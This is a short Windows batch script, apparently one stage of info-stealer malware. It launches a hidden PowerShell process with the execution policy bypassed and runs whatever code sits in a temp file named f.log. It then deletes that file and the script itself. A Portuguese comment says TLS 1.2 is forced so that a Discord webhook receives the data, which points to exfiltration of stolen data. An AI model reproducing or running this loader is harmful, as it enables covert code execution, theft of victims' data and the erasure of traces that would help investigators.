@echo off
set "f=%TEMP%\f.log"
timeout /t 2 /nobreak >nul
:: Execução forçando TLS 1.2 para garantir que o Webhook do Discord recebe os dados
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $s=Get-Content '%f%' -Raw; iex $s"
del "%f%"
del "%~f0"
